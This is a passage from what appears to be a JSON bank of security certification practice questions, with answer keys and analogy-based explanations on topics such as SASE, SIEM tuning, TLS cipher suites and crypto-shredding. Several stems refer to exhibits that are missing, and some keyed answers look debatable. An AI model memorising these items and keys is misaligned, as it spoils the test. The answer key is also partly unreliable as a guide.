binding","C":"NAC, to enforce device configuration requirements","D":"PAM, to enforce local password policies","E":"SD-WAN, to enforce web content filtering through external proxies","F":"DLP, to enforce data protection capabilities"},"answer":"B,C","explanation":"A written BYOD ban is a poster. Conditional access binds the login to a managed device. NAC checks the device at the network door.\n\nMFA, PAM, SD-WAN, and DLP do not answer 'is this phone even allowed.'\n\nImagine a club dress code on the wall plus a bouncer who can turn sneakers away.","choose":2,"pbq":false,"exhibits":[]},{"id":93,"domain":3,"stem":"An organization has several systems deployed in a public cloud and wants to confirm that when data retention periods are reached, the data is properly disposed of. Which of the following best meets the organization's needs?","options":{"A":"Double encrypting the data using both asymmetric and symmetric keys managed by the cloud service provider","B":"Utilizing a data-wiping software to overwrite the existing data","C":"Encrypting the data with customer-managed keys and then deleting both the encryption key and the volume","D":"Asking the cloud provider for copies of certificates of destruction"},"answer":"C","explanation":"In someone else’s cloud you often cannot watch platters get shredded. Crypto-shredding does the job: you encrypt with keys you own, then delete the keys and the volume so leftover blocks are unreadable.\n\nImagine shredding the only codebook for a diary you left in a rented locker, then throwing the locker key away.","choose":1,"pbq":false,"exhibits":[]},{"id":94,"domain":4,"stem":"A security engineer reviews an after-action report from a previous security breach and notes a long lag time between detection and containment of a compromised account. The engineer suggests using SOAR to address this concern. Which of the following best explains the engineer's goal?","options":{"A":"To prevent accounts from being compromised","B":"To enable log correlation using machine learning","C":"To orchestrate additional reporting for the security operations center","D":"To prepare runbooks to automate future incident response"},"answer":"D","explanation":"Detection-to-containment on a stolen account was slow. SOAR exists to run a written playbook — disable, ticket, notify — without waiting for a meeting.\n\nIt does not stop the first phish by itself.\n\nImagine a fire drill the system can start the moment the alarm rings.","choose":1,"pbq":false,"exhibits":[]},{"id":95,"domain":3,"stem":"During an audit at an organization, auditors find that developers are able to promote code to production. The auditors request a full review of all production changes. Which of the following should the organization implement to prevent a full review in the future?","options":{"A":"Branch protection","B":"Centralized code repositories","C":"Interactive application security testing","D":"Change control board"},"answer":"D","explanation":"Developers pushing their own code to production is a change-control failure. A change control board reviews and accepts production changes so “who wrote it” is not also “who released it.”\n\nImagine a newspaper editor who must sign off before a reporter’s story hits the front page.","choose":1,"pbq":false,"exhibits":[]},{"id":96,"domain":2,"stem":"A systems engineer is configuring SSO for a business that will be using SaaS applications for its remote-only workforce. Privileged actions in SaaS applications must be allowed only from corporate mobile devices that meet minimum security requirements, but BYOD must also be permitted for other activity. Which of the following would best meet this objective?","options":{"A":"Block any connections from outside the business's network security boundary.","B":"Install machine certificates on corporate devices and perform checks against the clients.","C":"Configure device attestations and continuous authorization controls.","D":"Deploy application protection policies using a corporate, cloud-based MDM solution."},"answer":"D","explanation":"Privileged SaaS actions only from healthy corporate phones, while BYOD may still do ordinary work. MDM app-protection policies can split those two without blocking the whole remote workforce.\n\nA full network block kills BYOD. Machine certs alone do not cover phones well.\n\nImagine a work badge that opens the vault only from the company phone, while the personal phone can still read the public bulletin board.","choose":1,"pbq":false,"exhibits":[]},{"id":97,"domain":3,"stem":"A systems administrator wants to reduce the number of failed patch deployments in an organization. The administrator discovers that system owners modify systems or applications in an ad hoc manner. Which of the following is the BEST way to reduce the number of failed patch deployments?","options":{"A":"Compliance tracking","B":"Situational awareness","C":"Change management","D":"Quality assurance"},"answer":"C","explanation":"Ad-hoc tweaks make each box a snowflake, so the same patch fails in mysterious ways. Change management records, approves, and baselines modifications so patches land on known systems.\n\nImagine a shared family calendar: nobody paints a room the same day the plumber is booked.","choose":1,"pbq":false,"exhibits":[]},{"id":98,"domain":3,"stem":"A network engineer must ensure that always-on VPN access is enabled but restricted to company assets. Which of the following best describes what the engineer needs to do?","options":{"A":"Generate device certificates using the specific template settings needed.","B":"Modify signing certificates in order to support IKE version 2.","C":"Create a wildcard certificate for connections from public networks.","D":"Add the VPN hostname as a SAN entry on the root certificate."},"answer":"A","explanation":"Always-on VPN for company assets only means the device itself must prove it is yours. Issue device certificates from a template that only managed hardware can enroll.\n\nImagine a parking garage that opens only for cars with a sticker the dealer welded on, not for any driver who knows the gate code.","choose":1,"pbq":false,"exhibits":[]},{"id":99,"domain":3,"stem":"A security administrator is reviewing the following code snippet from a website component: A review of the inc.tmp file shows the following: 214875925793253420385093450834534324525234352353455234532423534245234534523453896276563857932578395378543 Which of the following is most likely the reason for inaccuracies?","options":{"A":"A content management solution plug-in has been exploited.","B":"A search engine's bots are being blocked at the firewall.","C":"The relevant stylesheet has become corrupted.","D":"The WAF is configured to be in transparent mode."},"answer":"A","explanation":"The page is dumping a huge nonsense number from inc.tmp — typical of a compromised CMS plug-in writing garbage or attacker content into an include file the site then serves.\n\nImagine a restaurant menu binder where a ripped-out flyer was stuffed between the pages and the waiter is now reading the flyer out loud.","choose":1,"pbq":false,"exhibits":["exhibits/q099_1.png"]},{"id":100,"domain":2,"stem":"An organization wants to implement a platform to better identify which specific assets are affected by a given vulnerability. Which of the following components provides the BEST foundation to achieve this goal?","options":{"A":"SASE","B":"CMDB","C":"SBoM","D":"SIEM"},"answer":"B","explanation":"'Which assets have this CVE' needs an inventory of what you run and how it connects. That inventory is a CMDB.\n\nAn SBOM lists libraries in one product. SIEM lists events. SASE is an access fabric.\n\nImagine a warehouse map that says which aisle holds which box, so a recall can find every copy.","choose":1,"pbq":false,"exhibits":[]},{"id":101,"domain":3,"stem":"Which of the following best explains why AI output could be inaccurate?","options":{"A":"Model poisoning","B":"Social engineering","C":"Output handling","D":"Prompt injections"},"answer":"D","explanation":"Prompt injection is hostile text that tricks the model into ignoring its instructions and emitting the attacker’s answer. That output looks fluent and is still wrong or unsafe.\n\nImagine slipping a fake note into a waiter’s ticket that says “ignore the kitchen specials and bring raw chicken.”","choose":1,"pbq":false,"exhibits":[]},{"id":102,"domain":3,"stem":"A company runs a DAST scan on a web application. The tool outputs the following recommendations: • Use Cookie prefixes. • Content Security Policy - SameSite=strict is not set. Which of the following vulnerabilities has the tool identified?","options":{"A":"RCE","B":"XSS","C":"CSRF","D":"TOCTOU"},"answer":"C","explanation":"Cookie prefixes, a tight Content-Security-Policy, and SameSite=Strict are classic CSRF defenses: they stop a foreign site from riding a user’s logged-in cookie.\n\nImagine a shop that will not accept an order phoned in by a stranger using your stored credit card.","choose":1,"pbq":false,"exhibits":[]},{"id":103,"domain":2,"stem":"Which of the following best describes the reason a network architect would enable forward secrecy on all VPN tunnels?","options":{"A":"This process is a requirement to enable hardware-accelerated cryptography.","B":"This process reduces the success of attackers performing cryptanalysis.","C":"The business requirements state that confidentiality is a critical success factor.","D":"Modern cryptographic protocols list this process as a prerequisite for use."},"answer":"B","explanation":"Forward secrecy gives each session its own keys so stealing today's server key does not decrypt yesterday's VPN captures.\n\nThat is why architects turn it on: it shrinks the value of a later key theft.\n\nImagine a new hotel room code for every stay, so last year's master book cannot open last month's rooms.","choose":1,"pbq":false,"exhibits":[]},{"id":104,"domain":1,"stem":"Which of the following best explains the importance of determining organizational risk appetite when operating with a constrained budget?","options":{"A":"Risk appetite directly impacts acceptance of high-impact, low-likelihood events.","B":"Organizational risk appetite varies from organization to organization.","C":"Budgetary pressure drives risk mitigation planning in all companies.","D":"Risk appetite directly influences which breaches are disclosed publicly."},"answer":"A","explanation":"With a short budget you cannot treat every risk. Appetite is the board's line: which high-impact, rare events you will live with versus which you will still fund.\n\nImagine a household that cannot buy every insurance policy. Appetite is which storms they will cash-flow if they hit.\n\nPublic-disclosure rules and 'every company is different' do not tell you which item to pay for this year.","choose":1,"pbq":false,"exhibits":[]},{"id":105,"domain":3,"stem":"A company hired an email service provider called my-email.com to deliver company emails. The company started having several issues during the migration. A security engineer is troubleshooting and observes the following configuration snippet: Which of the following should the security engineer modify to fix the issue? (Choose two.)","options":{"A":"The email CNAME record must be changed to a type A record pointing to 192.168.1.11","B":"The TXT record must be changed to \"v=dmarc ip4:192.168.1.10 include:my-email.com ~all\"","C":"The srv01 A record must be changed to a type CNAME record pointing to the email server","D":"The email CNAME record must be changed to a type A record pointing to 192.168.1.10","E":"The TXT record must be changed to \"v=dkim ip4:192.168.1.11 include:my-email.com ~all\"","F":"The TXT record must be changed to \"v=spf ip4:192.168.1.10 include:my- email.com ~all\"","G":"The srv01 A record must be changed to a type CNAME record pointing to the web01 server"},"answer":"D,F","explanation":"Mail is now sent by my-email.com, so DNS must point the mail hostname at the real sending address and SPF must list both that address and the vendor.\n\nImagine updating both the return address printed on the envelope and the post-office list of who is allowed to use your letterhead.","choose":2,"pbq":false,"exhibits":["exhibits/q105_1.png"]},{"id":106,"domain":2,"stem":"After a company discovered a zero-day vulnerability in its VPN solution, the company plans to deploy cloud-hosted resources to replace its current on-premises systems. An engineer must find an appropriate solution to facilitate trusted connectivity. Which of the following capabilities is the MOST relevant?","options":{"A":"Container orchestration","B":"Microsegmentation","C":"Conditional access","D":"Secure access service edge"},"answer":"D","explanation":"The old VPN has a zero-day. They are moving to cloud and still need trusted user access without split tunnel. SASE is that cloud-delivered access plus inspection fabric.\n\nContainers and microsegmentation do not replace the broken VPN path.\n\nImagine one front door in the cloud for every office and every SaaS app, instead of a broken lock on the old basement door.","choose":1,"pbq":false,"exhibits":[]},{"id":107,"domain":4,"stem":"Recent reports indicate that a software tool is being exploited. Attackers were able to bypass user access controls and load a database. A security analyst needs to find the vulnerability and recommend a mitigation. The analyst generates the following output: Which of the following would the analyst most likely recommend?","options":{"A":"Installing appropriate EDR tools to block pass-the-hash attempts","B":"Adding additional time to software development to perform fuzz testing","C":"Removing hard-coded credentials from the source code","D":"Not allowing users to change their local passwords"},"answer":"C","explanation":"The output shows a secret sitting in source that let someone load a database. Take the hard-coded credential out.\n\nEDR and fuzzing are other programs.\n\nImagine a spare key taped inside the shop window. Remove the key.","choose":1,"pbq":false,"exhibits":["exhibits/q107_1.png"]},{"id":108,"domain":4,"stem":"The identity and access management team is sending logs to the SIEM for continuous monitoring. The deployed log collector is forwarding logs to the SIEM. However, only false positive alerts are being generated. Which of the following is the most likely reason for the inaccurate alerts?","options":{"A":"The compute resources are insufficient to support the SIEM.","B":"The SIEM indexes are too large.","C":"The data is not being properly parsed.","D":"The retention policy is not properly configured."},"answer":"C","explanation":"Collector is up, SIEM is alerting, every alert is junk. The usual cause is fields not parsed, so rules fire on the wrong tokens.\n\nImagine a clerk filing every letter under 'miscellaneous' and then paging you for each one.\n\nDisk size and retention are different problems.","choose":1,"pbq":false,"exhibits":[]},{"id":109,"domain":3,"stem":"The security team is receiving escalated support tickets stating that one of the company's publicly available websites is not loading as expected. Given the following observations: Which of the following is most likely the root cause?","options":{"A":"A certificate signed by a global root certification authority has expired.","B":"A protocol mismatch error is expected to occur when using outdated browsers.","C":"One certificate is being bound to multiple websites on the same server.","D":"Subject alternative names were not used appropriately for subdomains."},"answer":"D","explanation":"The public site fails in a way that matches a certificate name mismatch on a subdomain. A SAN (or wildcard) must list every hostname users type.\n\nImagine a concert ticket printed “Main Arena” when the door guard’s list says “Side Stage.”","choose":1,"pbq":false,"exhibits":["exhibits/q109_1.png"]},{"id":110,"domain":4,"stem":"A company acquires a location with a large infrastructure of legacy devices. Because of the hardware's age and the legacy software's limitations, the OS cannot be upgraded, and the machines cannot be virtualized. These machines are not publicly facing, but they do have internet access. The following controls are currently in place: • EDR • Anti-malware • Logging and monitoring • Host-based firewall • Proxied internet access A security architect needs to supplement the existing control strategy with one that restricts unauthorized software. Which of the following controls should the architect recommend to best supplement the existing environment?","options":{"A":"SIEM","B":"Isolation","C":"Conditional access","D":"Application control"},"answer":"D","explanation":"Legacy boxes cannot be rebuilt. You already have EDR, AV, logs, host firewall, and a proxy. The missing piece is 'only these programs may run' — application control / allow-listing.\n\nIsolation would lift them off the net. SIEM is more logs.\n\nImagine a guest list on the door of a room you cannot remodel.","choose":1,"pbq":false,"exhibits":[]},{"id":111,"domain":1,"stem":"An organization wants to create a threat model to identify vulnerabilities in its infrastructure. Which of the following should be prioritized first?","options":{"A":"External-facing infrastructure with known exploited vulnerabilities","B":"Internal infrastructure with high-severity and known exploited vulnerabilities","C":"External-facing infrastructure with a low risk score and no known exploited vulnerabilities","D":"External-facing infrastructure with a high risk score that can only be exploited with local access to the resource"},"answer":"A","explanation":"When you start a threat model, first treat internet-facing systems that already have known exploited bugs. Attackers do not need a foothold; the door is on the street and the pick is published.\n\nImagine boarding up the shop window that already has a broken latch before you worry about a closet lock on the third floor.\n\nAn internal high-severity box matters, but it is not reachable until someone is inside. A low-risk external box with no known exploit is not first.","choose":1,"pbq":false,"exhibits":[]},{"id":112,"domain":1,"stem":"A Chief Information Security Officer requests an action plan to remediate vulnerabilities. A security analyst reviews the output from a recent vulnerability scan and notices hundreds of unique vulnerabilities. The output includes the CVSS score, IP address, hostname, and the list of vulnerabilities. The analyst determines more information is needed in order to decide which vulnerabilities should be fixed immediately. Which of the following is the BEST source for this information?","options":{"A":"Third-party risk review","B":"Business impact analysis","C":"Incident response playbook","D":"Crisis management plan"},"answer":"B","explanation":"CVSS plus a hostname does not tell you which outage would stop payroll versus which would annoy a test lab.\n\nA business impact analysis names critical processes and the cost of downtime. That is how you decide what to patch tonight.\n\nImagine a scanner that lists every dripping faucet. The BIA tells you which faucet is over the electrical panel.\n\nA playbook or crisis plan tells you how to respond after something breaks. It does not rank the holes.","choose":1,"pbq":false,"exhibits":[]},{"id":113,"domain":4,"stem":"A security operations analyst is reviewing network traffic baselines for nightly database backups. Given the following information: Which of the following should the security analyst do next?","options":{"A":"Consult with a network engineer to determine the impact of bandwidth usage.","B":"Quarantine PRDDB01 and then alert the database engineers.","C":"Refer to the incident response playbook for the proper response.","D":"Review all the network logs for further data exfiltration."},"answer":"C","explanation":"Nightly backup traffic that does not match the baseline is an incident-response question first, not a bandwidth meeting and not an instant quarantine.\n\nOpen the playbook.\n\nImagine a truck at the dock at the wrong hour: read the night-shift card before you lock the driver in a closet.","choose":1,"pbq":false,"exhibits":["exhibits/q113_1.png"]},{"id":114,"domain":1,"stem":"A company has a requirement in customer contracts that states applications must undergo external audits to identify vulnerabilities. Which of the following is the best action for the company to complete before hiring an external auditor?","options":{"A":"Gather evidence for the audit.","B":"Conduct an internal audit assessment.","C":"Identify lessons learned from the audit.","D":"Select samples for audit testing."},"answer":"B","explanation":"Contracts require an external vulnerability audit. Before you pay that auditor, run your own pass so the obvious issues are already fixed and the scope is honest.\n\nImagine cleaning the kitchen before the health inspector arrives. You still want the inspector. You do not want the first finding to be yesterday's dishes.\n\nGathering evidence and picking samples are later audit steps. Lessons learned come after.","choose":1,"pbq":false,"exhibits":[]},{"id":115,"domain":4,"stem":"During DAST scanning, applications are consistently reporting code defects in open-source libraries that were used to build web applications. Most of the code defects are from using libraries with known vulnerabilities. The code defects are causing product deployment delays. Which of the following is the best way to uncover these issues earlier in the life cycle?","options":{"A":"Directing application logs to the SIEM for continuous monitoring","B":"Modifying the WAF polices to block against known vulnerabilities","C":"Completing an IAST scan against the web application","D":"Using a software dependency management solution"},"answer":"D","explanation":"The defects live in third-party libraries, not in your own source. A software-dependency / SCA tool inventories those libraries early and flags known-bad versions before DAST or production.\n\nImagine checking every ingredient’s recall list while you write the recipe, not after the meal is served.","choose":1,"pbq":false,"exhibits":[]},{"id":116,"domain":4,"stem":"A company's SIEM is designed to associate the company’s asset inventory with user events. Given the following report: Which of the following should a security engineer investigate first as part of a log audit?","options":{"A":"An endpoint that is not submitting any logs","B":"Potential activity indicating an attacker moving laterally in the network","C":"A misconfigured syslog server creating false negatives","D":"Unauthorized usage attempts of the administrator account"},"answer":"A","explanation":"A SIEM that maps users to assets should still hear from every endpoint. A host that submits zero logs is a blind spot — investigate that gap first.\n\nImagine a night watch where one floor’s radio has gone silent; you check that floor before arguing about a creaky door elsewhere.","choose":1,"pbq":false,"exhibits":["exhibits/q116_1.png"]},{"id":117,"domain":3,"stem":"A developer receives feedback about code quality and efficiency. The developer needs to identify and resolve the following coding issues before submitting the code changes for peer review: • Indexing beyond arrays • Dereferencing null pointers • Potentially dangerous data type combos • Unreachable code • Non-portable constructs Which of the following would be most appropriate for the developer to use in this situation?","options":{"A":"Linting","B":"SBoM","C":"DAST","D":"Branch protection","E":"Software composition analysis"},"answer":"A","explanation":"Linting is a static checker that catches exactly this list: bad indexes, null dereferences, messy types, dead code, and non-portable constructs — on the developer’s machine before peer review.\n\nImagine a grammar tool that underlines broken sentences before you email the draft to an editor.","choose":1,"pbq":false,"exhibits":[]},{"id":118,"domain":2,"stem":"A company wants to improve and automate the compliance of its cloud environments to meet industry standards. Which of the following resources should the company use to best achieve this goal?","options":{"A":"Jenkins","B":"Python","C":"Ansible","D":"PowerShell"},"answer":"C","explanation":"Automated cloud compliance is configuration-as-code. Ansible applies and proves the same baseline.\n\nJenkins is a pipeline runner. Python and PowerShell are languages. None is the compliance engine by itself.\n\nImagine a robot that runs the health-inspection checklist in every kitchen every night.","choose":1,"pbq":false,"exhibits":[]},{"id":119,"domain":2,"stem":"A company wants to protect against the most common attacks and rapidly integrate with different programming languages. Which of the following technologies is most likely to meet this need?","options":{"A":"RASP","B":"Cloud-based IDE","C":"DAST","D":"NIPS"},"answer":"A","explanation":"Common attacks, many languages, inside the running app: RASP.\n\nDAST is a test scan. NIPS is a network box. An IDE writes code.\n\nImagine a bodyguard standing next to the speaker, not a metal detector at the arena gate and not a book report on the speech.","choose":1,"pbq":false,"exhibits":[]},{"id":120,"domain":2,"stem":"An organization is concerned about insider threats from employees who have individual access to encrypted material. Which of the following techniques best addresses this issue?","options":{"A":"SSO with MFA","B":"Salting and hashing","C":"Account federation with hardware tokens","D":"SAE","E":"Key splitting"},"answer":"E","explanation":"If one employee holds the whole decryption key, that insider can read everything. Split the key so two people are needed.\n\nSSO and salting do not divide that key.\n\nImagine a safe-deposit box that needs two different keys from two different people.","choose":1,"pbq":false,"exhibits":[]},{"id":121,"domain":1,"stem":"A manufacturing plant is updating its IT services. During discussions, the senior management team created the following list of considerations: • Staff turnover is high and seasonal. • Extreme conditions often damage endpoints. • Losses from downtime must be minimized. • Regulatory data retention requirements exist. Which of the following best addresses the considerations?","options":{"A":"Establishing further environmental controls to limit equipment damage","B":"Using a non-persistent virtual desktop interface with thin clients","C":"Deploying redundant file servers and configuring database journaling","D":"Maintaining an inventory of spare endpoints for rapid deployment"},"answer":"B","explanation":"High seasonal turnover, beat-up endpoints, expensive downtime, and retention rules point to thin clients and non-persistent VDI: the desktop is a session, not a beloved laptop.\n\nWhen a terminal dies you hang a new cheap screen. When a temp leaves, the session vanishes. Data lives in the datacenter where retention applies.\n\nImagine a library PC that forgets the last user when they stand up, instead of issuing a new laptop every harvest season.\n\nSpare laptops and extra file servers still leave data on devices that get dropped in the plant.","choose":1,"pbq":false,"exhibits":[]},{"id":122,"domain":3,"stem":"A software vendor provides routine functionality and security updates to its global customer base. The vendor would like to ensure distributed updates are authorized, originate from only the company, and have not been modified by others. Which of the following solutions best supports these objectives?","options":{"A":"Envelope encryption","B":"File integrity monitoring","C":"Application control","D":"Code signing"},"answer":"D","explanation":"A vendor signature on the update file proves it came from that company and that the bytes were not swapped in transit.\n\nImagine a factory seal on a spare part; a broken seal means do not bolt it onto the engine.","choose":1,"pbq":false,"exhibits":[]},{"id":123,"domain":4,"stem":"A security analyst detects a possible RAT infection on a computer in the internal network. After reviewing the details of the alert, the analyst identifies the initial vector of the attack was an email that was forwarded to multiple recipients in the same organizational unit. Which of the following should the analyst do first to minimize this type of threat in the future?","options":{"A":"Move from an anti-malware software to an EDR solution.","B":"Perform a penetration test to detect technology gaps on the anti-spam solution.","C":"Configure an IPS solution in the internal network to mitigate infections.","D":"Implement a security awareness program in the organization."},"answer":"D","explanation":"The RAT arrived because a person forwarded a bad email to their whole team. Teach people how to spot and stop that forward — awareness first — while you plan tool upgrades.\n\nImagine a fake “CEO text” asking for gift cards; the first fix is teaching staff that those texts are a known scam.","choose":1,"pbq":false,"exhibits":[]},{"id":124,"domain":2,"stem":"A cloud engineer needs to identify appropriate solutions to: • Provide secure access to internal and external cloud resources. • Eliminate split-tunnel traffic flows. • Enable identity and access management capabilities. Which of the following solutions is the most appropriate?","options":{"A":"Microsegmentation","B":"PAM","C":"SD-WAN","D":"SASE"},"answer":"D","explanation":"Internal and external cloud, no split tunnel, identity-aware: SASE.\n\nSD-WAN steers links. PAM holds admin passwords. Microsegmentation is east-west inside a site.\n\nImagine one checkpoint that covers every gate instead of a different line per airline — without needing a pilot's license to picture a single front door.","choose":1,"pbq":false,"exhibits":[]},{"id":125,"domain":3,"stem":"A security engineer is building a solution to disable weak CBC configurations for remote access connections to Linux systems. Which of the following should the security engineer modify?","options":{"A":"The /etc/openssl.conf file, updating the virtual site parameter","B":"The /etc/nsswitch.conf file, updating the name server","C":"The /etc/hosts file, updating the IP parameter","D":"The /etc/sshd/ssh_config file, updating the ciphers"},"answer":"D","explanation":"Linux remote shells honor cipher lists in the SSH client/server config. Turning off CBC there stops weak CBC suites for those connections.\n\nImagine a club bouncer’s list of acceptable IDs posted at the door — you edit that list, not the kitchen menu.","choose":1,"pbq":false,"exhibits":[]},{"id":126,"domain":3,"stem":"A security engineer is reviewing the results of an annual penetration test. The report lists one of the results as \"critical severity\" on several domain-joined workstations: SSL/TLS Weak Protocols Supported TLS 1.0, TLS 1.1 Which of the following should the security engineer implement to remediate this finding in the most centralized manner?","options":{"A":"An SCCM patch to disable weak protocols in the Schannel hive","B":"A GPO to disable weak protocols in the Schannel hive","C":"A PowerShell script to disable weak protocols in the HKLM Schannel hive","D":"A registry script to disable weak protocols in the Schannel hive"},"answer":"B","explanation":"Every domain-joined Windows PC reads Group Policy. One GPO that disables TLS 1.0/1.1 in Schannel fixes the weak-protocol finding everywhere.\n\nImagine one school-district memo that changes the dress code at every campus, instead of taping a note on each locker.","choose":1,"pbq":false,"exhibits":[]},{"id":127,"domain":4,"stem":"An analyst reviews a SIEM and generates the following report: Only HOST002 is authorized for internet traffic. Which of the following statements is accurate?","options":{"A":"The VM002 host is misconfigured and needs to be revised by the network team.","B":"The HOST002 host is under attack, and a security incident should be declared.","C":"The SIEM platform is reporting multiple false positives on the alerts.","D":"The network connection activity is unusual, and a network infection is highly possible."},"answer":"C","explanation":"Only HOST002 may use the internet, and the SIEM still screams about the others as if they were doing the same thing. Those extra alarms are false positives to tune.\n\nImagine a smoke detector that chirps every time someone makes toast, while only the kitchen is allowed to use the oven.","choose":1,"pbq":false,"exhibits":["exhibits/q127_1.png"]},{"id":128,"domain":2,"stem":"A company wants to implement a three-tier approach to separate the web, database, and application servers. A security administrator must harden the environment. Which of the following is the best solution?","options":{"A":"Deploying a VPN to prevent remote locations from accessing server VLANs","B":"Configuring a SASE solution to restrict users to server communication","C":"Implementing microsegmentation on the server VLANs","D":"Installing a firewall and making it the network core"},"answer":"C","explanation":"Three tiers that must not freely talk: microsegmentation on those VLANs.\n\nA core firewall is one chokepoint. VPN and SASE are user-path tools.\n\nImagine fire doors between kitchen, dining room, and pantry so a grease fire does not take the house.","choose":1,"pbq":false,"exhibits":[]},{"id":129,"domain":4,"stem":"A systems administrator wants to use existing resources to automate reporting from disparate security appliances that do not currently communicate. Which of the following is the best way to meet this objective?","options":{"A":"Configuring an API integration to aggregate the different data sets","B":"Combining back-end application storage into a single, relational database","C":"Purchasing and deploying commercial off-the-shelf aggregation software","D":"Migrating application usage logs to on-premises storage"},"answer":"A","explanation":"The appliances already exist; they just do not speak to each other. An API integration pulls each vendor’s data into one report without buying a new product.\n\nImagine three stores texting their daily totals to one bookkeeper instead of moving into the same building.","choose":1,"pbq":false,"exhibits":[]},{"id":130,"domain":3,"stem":"A vulnerability scan on a web server identified the following: Which of the following actions would MOST likely eliminate on-path decryption attacks? (Choose two.)","options":{"A":"Disallowing cipher suites that use ephemeral modes of operation for key agreement","B":"Removing support for CBC-based key exchange and signing algorithms","C":"Adding TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA256","D":"Implementing HIPS rules to identify and block BEAST attack attempts","E":"Restricting cipher suites to only allow TLS_RSA_WITH_AES_128_CBC_SHA","F":"Increasing the key length to 256 for TLS_RSA_WITH_AES_128_CBC_SHA"},"answer":"B,C","explanation":"On-path TLS tricks thrive on old CBC suites and RSA key-exchange. Drop CBC and add a modern suite (ECDHE + ECDSA + AES-GCM).\n\nImagine replacing a cheap padlock that pickers already posted a YouTube video about with a modern lock whose keyway is not in those videos.","choose":2,"pbq":false,"exhibits":["exhibits/q130_1.png"]},{"id":131,"domain":4,"stem":"A company’s help desk is experiencing a large number of calls from the finance department stating access issues to www.bank.com. The security operations center reviewed the following security logs: Which of the following is most likely the cause of the issue?","options":{"A":"Recursive DNS resolution is failing.","B":"The DNS record has been poisoned.","C":"DNS traffic is being sinkholed.","D":"The DNS was set up incorrectly."},"answer":"B","explanation":"Finance users type www.bank.com and land in the wrong place while your logs show the name answering with an unexpected address. That is DNS cache/record poisoning.\n\nImagine someone swapping the sign on the bank building so customers walk into a fake lobby next door.","choose":1,"pbq":false,"exhibits":["exhibits/q131_1.png"]},{"id":132,"domain":1,"stem":"A financial services organization is using AI to fully automate the process of deciding client loan rates. Which of the following should the organization be most concerned about from a regulatory perspective?","options":{"A":"Model explain ability","B":"Credential theft","C":"Possible prompt injections","D":"Exposure to social engineering"},"answer":"A","explanation":"A fully automated loan-rate model is a regulated credit decision. Supervisors will ask why this applicant got 8% and that one got 14%.\n\nModel explainability is that 'why.' Credential theft and prompt injection are security issues, not the first regulatory concern for an automated credit decision.\n\nImagine a loan officer who shrugs and says 'the computer said so' when a customer or a regulator asks. That shrug is the finding.","choose":1,"pbq":false,"exhibits":[]},{"id":133,"domain":4,"stem":"A security analyst is reviewing the following log: Which of the following possible events should the security analyst investigate further?","options":{"A":"A macro that was prevented from running","B":"A text file containing passwords that were leaked","C":"A malicious file that was run in this environment","D":"A PDF that exposed sensitive information improperly"},"answer":"C","explanation":"The log line that matters is a file that actually executed in the sandbox or host. A blocked macro or a leaked-password text file is noisy; a binary that ran is the event to chase.\n\nImagine a security camera: people walking past the door are less urgent than the person who went inside.","choose":1,"pbq":false,"exhibits":["exhibits/q133_1.png"]},{"id":134,"domain":3,"stem":"A security operations engineer needs to prevent inadvertent data disclosure when encrypted SSDs are reused within an enterprise. Which of the following is the most secure way to achieve this goal?","options":{"A":"Executing a script that deletes and overwrites all data on the SSD three times","B":"Wiping the SSD through degaussing","C":"Securely deleting the encryption keys used by the SSD","D":"Writing non-zero, random data to all cells of the SSD"},"answer":"C","explanation":"Encrypted SSDs hold ciphertext. Deleting the media-encryption keys (crypto-shredding) makes leftover cells unreadable.\n\nImagine shredding the only key to a locked filing cabinet you are handing to the next tenant.","choose":1,"pbq":false,"exhibits":[]},{"id":135,"domain":4,"stem":"A security professional is investigating a trend in vulnerability findings for newly deployed cloud systems. Given the following output: Which of the following actions would address the root cause of this issue?","options":{"A":"Automating the patching system to update base images","B":"Recompiling the affected programs with the most current patches","C":"Disabling unused/unneeded ports on all servers","D":"Deploying a WAF with virtual patching upstream of the affected systems."},"answer":"A","explanation":"New cloud boxes keep showing the same old CVEs because they were cloned from a stale gold image. Patch the base image and automate that update.\n\nImagine a cookie cutter that still has last year’s mold; fix the cutter instead of frosting each cookie by hand.","choose":1,"pbq":false,"exhibits":["exhibits/q135_1.png"]},{"id":136,"domain":1,"stem":"A company established a new process for business analysts to receive emails that contain links for purchase requests. The new process requires links to be submitted through new emails. Which of the following is the best way to secure this process without disrupting order fulfillment?","options":{"A":"Deploying a browser isolation solution","B":"Blocking all potentially malicious links","C":"Enforcing security awareness training","D":"Implementing DNS filtering"},"answer":"A","explanation":"Analysts must open purchase-request links without turning the corporate desktop into the browser that fetches the payload.\n\nBrowser isolation opens the link in a disposable remote session. Order fulfillment still works. A block-all rule would stop the work.\n\nImagine opening a suspicious envelope inside a sealed glove box instead of at your kitchen table.\n\nAwareness training and DNS filters help. They do not contain the click the new process still requires.","choose":1,"pbq":false,"exhibits":[]},{"id":137,"domain":3,"stem":"An organization receives OSINT reports about an increase in ransomware targeting fileshares at peer companies. The organization wants to deploy hardening policies to its servers and workstations in order to contain potential ransomware. Which of the following should an engineer do to best achieve this goal?","options":{"A":"Allow only interactive log-in for users on workstations and restrict port 445 traffic to fileshares.","B":"Enable biometric authentication mechanisms on user workstations and block port 53 traffic.","C":"Instruct users to use a password manager when generating new credentials and secure port 443 traffic.","D":"Give users permission to rotate administrator passwords and deny port 80 traffic."},"answer":"A","explanation":"Ransomware on fileshares usually arrives from a user’s session and then talks SMB (port 445) to encrypt the share. Interactive-only logons on workstations plus tight 445 rules to the file servers cut both paths.\n\nImagine a vault that only opens when a teller is standing there, and only that teller’s window can reach the cash drawers.","choose":1,"pbq":false,"exhibits":[]},{"id":138,"domain":3,"stem":"A malicious actor exploited firmware vulnerabilities and used rootkits in an attack on an organization. After the organization recovered from the incident, an engineer needs to recommend a solution that reduces the likelihood of the same type of attack in the future. Which of the following is the MOST relevant solution?","options":{"A":"Enabling software integrity checks","B":"Installing self-encrypting drives","C":"Implementing measured boot","D":"Configuring host-based encryption"},"answer":"C","explanation":"Firmware rootkits hide below the OS. Measured boot hashes firmware and boot files into a TPM so a changed BIOS or bootloader fails attestation.\n\nImagine weighing a sealed crate at every dock; a crate that is suddenly heavier is not allowed into the warehouse.","choose":1,"pbq":false,"exhibits":[]},{"id":139,"domain":3,"stem":"Which of the following enables the meaningful manipulation of encrypted data when the processor does not know the encryption key?","options":{"A":"Simultaneous authentication of equals","B":"Envelope encryption","C":"Authenticated encryption with associated data","D":"Homomorphic encryption"},"answer":"D","explanation":"Homomorphic encryption lets a processor add or multiply ciphertext and get an encrypted result that decrypts to the right answer — without ever seeing the key or the plaintext.\n\nImagine a locked suggestion box that can still tally the votes while nobody opens the 